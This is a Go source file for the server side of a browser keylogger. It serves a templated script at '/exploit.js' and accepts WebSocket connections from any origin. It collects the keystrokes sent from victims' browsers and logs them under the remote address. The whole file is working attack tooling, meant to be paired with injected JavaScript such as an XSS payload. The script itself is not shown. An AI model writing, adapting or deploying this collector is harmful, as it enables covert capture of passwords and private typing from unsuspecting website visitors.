package http

import (
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

type KeyLogger struct {
	Upgrader   websocket.Upgrader
	ListenAddr string
	WsAddr     string
	JsTemplate *template.Template
}

func NewKeyLogger(listenAddr, wsAddr, jsTemplateFilePath string) *KeyLogger {
	jsTemplate, err := template.ParseFiles(jsTemplateFilePath)
	if err != nil {
		log.Panicf("[!] Unable to render Js template due to error: %s\n", err)
		return nil
	}

	return &KeyLogger{
		Upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
		ListenAddr: listenAddr,
		WsAddr:     wsAddr,
		JsTemplate: jsTemplate,
	}
}

func (logger *KeyLogger) ServeWsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := logger.Upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Panicf("[!] Unable to upgrade WS connection due to error: %s\n", err)
	}

	defer conn.Close()
	remoteAddr := conn.RemoteAddr().String()
	log.Printf("[*] WS Connection incoming from remote address: %s\n", remoteAddr)

	// TODO: maintain all logs into a string and latest dump it into a txt file.
	// handle connection
	var message string
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[*] Keystrokes from %s -> %s", remoteAddr, message)
			log.Printf("[!] Closing connection with %s due to error: %s\n", remoteAddr, err)
			return
		}
		message = message + string(msg)
	}
}

func (logger *KeyLogger) ServeFileHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("[*] Incoming connection from %s", r.RemoteAddr)
	w.Header().Set("Content-Type", "application/javascript")
	logger.JsTemplate.Execute(w, logger.WsAddr)
}

func (logger *KeyLogger) StartLogger() {
	r := mux.NewRouter()
	r.HandleFunc("/ws", logger.ServeWsHandler)
	r.HandleFunc("/exploit.js", logger.ServeFileHandler)

	log.Printf("[*] Listening on %s\n", logger.ListenAddr)
	log.Fatalln(http.ListenAndServe(logger.ListenAddr, r))
}
